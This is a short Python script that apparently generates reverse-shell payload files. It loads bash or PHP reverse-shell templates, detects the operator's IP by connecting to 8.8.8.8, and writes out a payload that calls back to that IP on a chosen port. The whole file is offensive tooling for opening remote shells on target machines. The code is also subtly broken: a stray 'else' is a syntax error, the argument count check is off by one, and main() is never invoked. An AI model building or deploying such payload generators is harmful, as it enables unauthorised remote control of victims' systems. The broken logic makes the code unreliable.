#!/bin/python3

import sys
import socket
from client import Client
from switch import Switch

REQUIRED_ARGUMENTS = 3 
GOOGLE_DNS_IP = "8.8.8.8"
RPORT = 80
BASH_REVERSE_SHELL_PATH = "bash_reverse_shell.txt" 
PHP_REVERSE_SHELL_PATH = "php_reverse_shell.txt"
LANGUAGES = {
        "bash": BASH_REVERSE_SHELL_PATH,
        "php": PHP_REVERSE_SHELL_PATH



        }
SWITCHES = Switch("i", "e")



def get_ip(rhost, rport):
    try:
        client = Client(rhost, rport)
        ip = client.ip
        client.stop()
        return ip
    except Exception as e:
        print("{}:Error Connecting to Google...".format(e))

def load_reverse_shell(shell_path):
    with open(shell_path,'r',encoding='utf-8') as f:
        return f.read()

def create_reverse_shell_file(path, reverse_shell, lhost, lport):
    with open(path,'w',encoding='utf-8') as f:
        f.write(reverse_shell%(lhost, lport))


def main():
    try: 
        if(len(sys.argv) < REQUIRED_ARGUMENTS):
            print("Please provide a language, port, and path")

        else:
            language = sys.argv[1]
            lport = sys.argv[2]
            path = sys.argv[3]
            if language in LANGUAGES.keys():
                create_reverse_shell_file(path,load_reverse_shell(LANGUAGES[language]), get_ip(GOOGLE_DNS_IP, RPORT), lport) 
        else:
            print("Please enter a valid language")
    except Exception as e:
        print("{}:Something has gone very wrong...".format(e))

